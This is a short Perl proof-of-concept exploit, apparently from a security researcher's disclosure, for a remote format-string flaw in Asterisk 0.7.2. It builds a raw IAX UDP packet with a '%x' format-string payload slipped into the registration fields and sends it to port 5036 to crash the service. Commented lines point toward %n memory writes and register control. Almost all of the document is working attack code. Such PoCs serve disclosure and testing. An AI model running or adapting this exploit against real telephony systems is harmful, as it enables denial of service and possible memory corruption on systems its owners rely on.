#!/usr/bin/perl
#
# Asterisk 0.7.2 Linux PBX Remote Format string DoS (PoC)
#
# Feb 29 22:58:08 NOTICE[27151280]: Rejected connect attempt from 127.0.0.1, request
# 'exten=;callerid=;dnid=;context=;username=ce0ca0;language=;formats=;version=;}'

#
# kfinisterre[at]secnetops[dot]com - Copyright Secure Network Operations.
#

use IO::Socket::INET;

$sock=new IO::Socket::INET->new(PeerPort=>5036, Proto=>'udp', PeerAddr=>'localhost');
#$malpayload = "%.10d.";
#$malpayload .= "%.10d"; # add 6 to length
#$malpayload .="%n"; # write to the third address... we
have control of $esi
$malpayload = "AAAABBBB" . "%x." x 25;
$malpayload .="\x3b";

$payload = "\xa3\x7d\xff\xff\x00\x00\x00\x01\x00\x00\x06\x01\x65\x78\x74\x65\x6e\x3d\x3b" . # extern=;
"\x63\x61\x6c\x6c\x65\x72\x69\x64\x3d\x3b" . # callerid=;
"\x64\x6e\x69\x64\x3d\x3b" . # dnid=;
"\x63\x6f\x6e\x74\x65\x78\x74\x3d\x3b" . # context=;
"$malpayload" .
"\x75\x73\x65\x72\x6e\x61\x6d\x65\x3d" . # username=;
"\x6c\x61\x6e\x67\x75\x61\x67\x65\x3d\x3b" . # language=;
"\x66\x6f\x72\x6d\x61\x74\x73\x3d\x3b" . # formats=;
"\x76\x65\x72\x73\x69\x6f\x6e\x3d\x3b" . # version=;
"\xa3\x7d\xff\xff\x00\x00\x00\x15\x00\x01\x06\x0b"; # end of payload

$sock->send($payload);
close($sock);
